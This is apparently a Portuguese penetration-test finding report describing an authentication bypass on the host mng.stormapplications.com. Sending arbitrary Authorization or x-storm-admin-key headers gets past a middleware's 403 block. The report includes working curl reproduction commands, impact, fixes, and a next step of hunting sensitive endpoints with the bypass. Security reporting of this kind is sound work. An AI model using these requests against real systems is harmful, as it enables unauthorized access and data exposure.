# F-002 403 Authentication Bypass via Custom Headers
Alvo: mng.stormapplications.com
Severidade: Alta
Timestamp: 2026-08-23T04:00:00Z

## Reprodução
```bash
# Sem autenticação → 403 FORBIDDEN
curl -sk https://mng.stormapplications.com/api/login
# {"code":"FORBIDDEN"}

# Com qualquer Authorization header → 200 (página de login)
curl -sk -H "Authorization: Bearer admin" https://mng.stormapplications.com/api/login
# Retorna página HTML de erro OAuth (15333 bytes)

# Com x-storm-admin-key → 200 (página de login)
curl -sk -H "x-storm-admin-key: admin" https://mng.stormapplications.com/api/login
# Retorna página HTML de erro OAuth (15333 bytes)
```

## Output
Com auth header: Retorna página HTML completa do Discord OAuth callback error
Sem auth header: `{"code":"FORBIDDEN"}`

## Interpretação
O middleware Caddy/discloud está configurado para bloquear requisições não autenticadas com 403. No entanto, a presença de qualquer header de autenticação (Authorization, x-storm-admin-key, x-admin-key, x-api-key) faz o middleware permitir o request, que então é processado pelo backend. Qualquer valor nesses headers funciona como bypass.

## Impacto
- Bypass total da proteção 403 para `/api/login`
- Permite enumeration de endpoints não autorizados
- Pode ser usado como vetor para ataques de força bruta

## Recomendação
- Implementar validação real de tokens/credenciais no middleware
- Não confiar apenas na presença do header para autorização
- Usar autenticação forte (JWT validado) antes de permitir acesso ao backend

## Próximo passo
Testar bypass em outros endpoints e tentar encontrar endpoints que retornem dados sensíveis com o bypass.
